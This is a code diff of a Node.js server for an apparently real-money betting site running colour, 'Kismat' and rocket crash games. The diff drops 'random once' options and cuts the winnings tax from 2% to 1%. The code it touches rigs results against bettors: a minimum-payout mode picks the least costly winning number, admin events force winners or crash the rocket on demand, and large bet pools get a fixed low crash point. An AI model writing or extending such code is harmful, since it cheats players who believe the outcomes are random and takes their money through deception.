@@ -101,11 +101,11 @@ function getISTTime() {
 }
 
 let gameState = { period: 20261017001, timeLeft: 30, mode: 'MIN_PAYOUT', forcedNumber: null, history: [] };
-let kismatState = { period: 20261017001, timeLeft: 150, history: [], randomOnce: false };
+let kismatState = { period: 20261017001, timeLeft: 150, history: [] };
 let currentKismatBets = [];
 let forcedKismatOption = null;
 
-let rocketState = { status: 'WAITING', countdown: 5.0, multiplier: 1.00, crashPoint: 2.50, forcedNextCrash: null, randomOnce: false, history: [] };
+let rocketState = { status: 'WAITING', countdown: 5.0, multiplier: 1.00, crashPoint: 2.50, forcedNextCrash: null, history: [] };
 let currentRoundBets = [];
 let rocketBets = [];
 let cachedUsers = new Map();
@@ -155,16 +155,13 @@ function calculatePayoutForNumber(num) {
   return totalPayout;
 }
 
-// Colour Game Timer (With 2% Tax & 1-Round Random Option)
+// Colour Game Timer
 setInterval(async () => {
   gameState.timeLeft -= 1;
   if (gameState.timeLeft <= 0) {
     let winNum = Math.floor(Math.random() * 10);
     if (gameState.mode === 'MANUAL' && gameState.forcedNumber !== null) {
       winNum = Number(gameState.forcedNumber);
-    } else if (gameState.mode === 'RANDOM_ONCE') {
-      winNum = Math.floor(Math.random() * 10);
-      gameState.mode = 'MIN_PAYOUT'; // Revert back automatically after 1 round
     } else {
       let bestNums = [];
       let minPay = Infinity;
@@ -184,7 +181,7 @@ setInterval(async () => {
       else if (winCols.includes(b.choice)) { won = true; rawWin = b.amount * b.multiplier; }
       
       if (won) {
-        const tax = +(rawWin * 0.02).toFixed(3); // 2% TAX APPLIED
+        const tax = +(rawWin * 0.01).toFixed(3);
         b.winAmount = +(rawWin - tax).toFixed(3);
         b.status = 'WON';
       } else {
@@ -209,13 +206,14 @@ setInterval(async () => {
     gameState.period += 1;
     gameState.timeLeft = 30;
     gameState.forcedNumber = null;
+    if (gameState.mode === 'MANUAL') gameState.mode = 'MIN_PAYOUT';
     currentRoundBets = [];
   }
   io.emit('tick', { period: gameState.period, timeLeft: gameState.timeLeft, history: gameState.history });
   io.emit('admin_update', await getAdminPayload());
 }, 1000);
 
-// Kismat Game Timer (With 2% Tax & 1-Round Random Option)
+// Kismat Game Timer
 setInterval(async () => {
   kismatState.timeLeft -= 1;
   if (kismatState.timeLeft <= 0) {
@@ -224,9 +222,6 @@ setInterval(async () => {
     if (forcedKismatOption !== null) {
       winOption = forcedKismatOption;
       forcedKismatOption = null;
-    } else if (kismatState.randomOnce) {
-      winOption = Math.floor(Math.random() * 10) + 1;
-      kismatState.randomOnce = false; // Revert back automatically after 1 round
     } else {
       let bettedOptions = new Set();
       currentKismatBets.forEach(b => {
@@ -250,7 +245,7 @@ setInterval(async () => {
       if (b.choice === `Option #${winOption}`) {
         b.status = 'WON';
         const rawWin = b.amount * 9;
-        const tax = +(rawWin * 0.02).toFixed(3); // 2% TAX APPLIED
+        const tax = +(rawWin * 0.01).toFixed(3);
         b.winAmount = +(rawWin - tax).toFixed(3);
         
         const u = cachedUsers.get(b.phone);
@@ -279,7 +274,7 @@ setInterval(async () => {
   io.emit('admin_update', await getAdminPayload());
 }, 1000);
 
-// Optimized Rocket Game Loop (With 1-Round Random Option & 2% Tax on Cashout)
+// Optimized Fast Rocket Game Loop
 setInterval(async () => {
   if (rocketState.status === 'WAITING') {
     rocketState.countdown = +(rocketState.countdown - 0.1).toFixed(1);
@@ -293,10 +288,6 @@ setInterval(async () => {
       if (rocketState.forcedNextCrash !== null) {
         rocketState.crashPoint = rocketState.forcedNextCrash;
         rocketState.forcedNextCrash = null;
-      } else if (rocketState.randomOnce) {
-        let highChance = Math.random() < 0.25;
-        rocketState.crashPoint = highChance ? +(20 + Math.random() * 150).toFixed(2) : +(1.10 + Math.random() * 5).toFixed(2);
-        rocketState.randomOnce = false; // Revert back automatically after 1 flight
       } else if (totalPool >= 1000) {
         let targetProfitMultiplier = +(1 + 0.80).toFixed(2);
         rocketState.crashPoint = +(targetProfitMultiplier + (Math.random() * 0.15)).toFixed(2);
@@ -718,6 +709,7 @@ io.on('connection', (socket) => {
     io.emit('admin_update', await getAdminPayload());
   });
 
+  // HIGH PERFORMANCE FAST ROCKET BET
   socket.on('rocket_place_bet', async ({ phone, name, amount }) => {
     let u = cachedUsers.get(phone);
     if (!u) {
@@ -751,16 +743,14 @@ io.on('connection', (socket) => {
     io.emit('admin_update', await getAdminPayload());
   });
 
-  // ROCKET CASHOUT WITH 2% TAX
+  // HIGH PERFORMANCE FAST ROCKET CASHOUT
   socket.on('rocket_cashout', async ({ phone }) => {
     if (rocketState.status !== 'FLYING') return;
     const rBet = rocketBets.find(b => b.phone === phone && !b.cashedOut);
     if (!rBet) return;
     rBet.cashedOut = true;
     rBet.status = 'WON';
-    const rawWin = rBet.amount * rocketState.multiplier;
-    const tax = +(rawWin * 0.02).toFixed(3); // 2% TAX APPLIED
-    rBet.winAmount = +(rawWin - tax).toFixed(3);
+    rBet.winAmount = +(rBet.amount * rocketState.multiplier * 0.99).toFixed(3);
     
     await Bet.updateOne({ id: rBet.id }, { status: 'WON', winAmount: rBet.winAmount });
 
@@ -845,6 +835,7 @@ io.on('connection', (socket) => {
     }
   });
 
+  // ADMIN TRANSACTION APPROVAL / REJECTION & REFUND
   socket.on('admin_process_tx', async ({ txId, approve }) => {
     const tx = await Transaction.findOne({ id: txId });
     if (tx && tx.status === 'PENDING') {
@@ -876,6 +867,7 @@ io.on('connection', (socket) => {
     }
   });
 
+  // INSTANT DELETION HANDLERS FROM ADMIN PANEL
   socket.on('admin_delete_transaction', async (txId) => {
     try {
       await Transaction.deleteOne({ id: txId });
@@ -921,26 +913,10 @@ io.on('connection', (socket) => {
     forcedKismatOption = Number(opt);
   });
 
-  socket.on('admin_colour_set_random_once', () => {
-    gameState.mode = 'RANDOM_ONCE';
-    gameState.forcedNumber = null;
-    io.emit('admin_update', getAdminPayloadSync());
-  });
-
-  socket.on('admin_kismat_set_random_once', () => {
-    kismatState.randomOnce = true;
-    forcedKismatOption = null;
-  });
-
   socket.on('admin_rocket_crash_now', () => {
     if (rocketState.status === 'FLYING') {
       rocketState.crashPoint = rocketState.multiplier;
     }
-  });
-
-  socket.on('admin_rocket_set_random_once', () => {
-    rocketState.randomOnce = true;
-    rocketState.forcedNextCrash = null;
   });
 
   socket.on('admin_rocket_set_next', (val) => {
